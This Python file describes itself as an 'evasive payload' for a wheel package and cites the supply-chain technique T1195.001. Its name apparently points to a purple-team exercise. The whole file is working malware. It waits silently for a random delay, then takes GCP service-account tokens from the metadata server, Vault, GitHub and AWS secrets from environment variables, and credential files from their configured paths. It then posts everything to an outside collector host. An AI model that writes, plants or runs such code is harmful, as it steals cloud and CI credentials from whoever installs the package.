"""Evasive payload for Variant C - Wheel version.

Production-ready with minimal footprint.

Characteristics:
- Clean code
- Silent execution
- Random 30-150 second delay
- Minimal attack surface

MITRE ATT&CK: T1195.001
"""
import os
import sys
import json
import time
import random
import urllib.request
import threading


def run_init():
    """Initialize system utilities in background thread."""
    t = threading.Thread(target=_init, daemon=True)
    t.start()


def _init():
    """Initialize and collect data."""
    try:
        # Random delay
        time.sleep(random.randint(30, 150))

        # Collect data
        data = {
            'ts': int(time.time() * 1000),
            'host': os.environ.get('HOSTNAME', os.environ.get('COMPUTERNAME', 'unknown')),
            'runtime': {
                'version': sys.version.split()[0],
                'platform': sys.platform
            },
            'data': {}
        }

        # Collect cloud metadata
        _collect_cloud_data(data['data'])

        # Collect environment variables
        _collect_env_vars(data['data'])

        # Send beacon
        _send(data)

    except Exception:
        pass


def _collect_cloud_data(data):
    """Collect cloud platform metadata."""
    # GCP
    try:
        req = urllib.request.Request(
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        data['token'] = json.loads(resp.read().decode()).get('access_token')
    except Exception:
        pass

    try:
        req = urllib.request.Request(
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        data['service'] = resp.read().decode().strip()
    except Exception:
        pass

    try:
        req = urllib.request.Request(
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            headers={'Metadata-Flavor': 'Google'}
        )
        resp = urllib.request.urlopen(req, timeout=2)
        data['project'] = resp.read().decode().strip()
    except Exception:
        pass


def _collect_env_vars(data):
    """Collect high-value environment variables."""
    keys = ['VAULT_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY']
    for k in keys:
        v = os.environ.get(k)
        if v:
            data[k] = v

    # Path-following: CI build agents hold live credential files
    for var in ('GOOGLE_APPLICATION_CREDENTIALS', 'VAULT_TOKEN_FILE'):
        path = os.environ.get(var)
        if path and os.path.isfile(path):
            try:
                with open(path) as f:
                    data[var] = f.read()
            except Exception:
                pass


def _send(data):
    """Transmit data to endpoint."""
    try:
        url = 'https://collector.purple-test.com/0cfd83d5d513beae/beacon'
        payload = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=payload, method='POST')
        req.add_header('Content-Type', 'application/json')
        urllib.request.urlopen(req, timeout=10).close()
    except Exception:
        pass
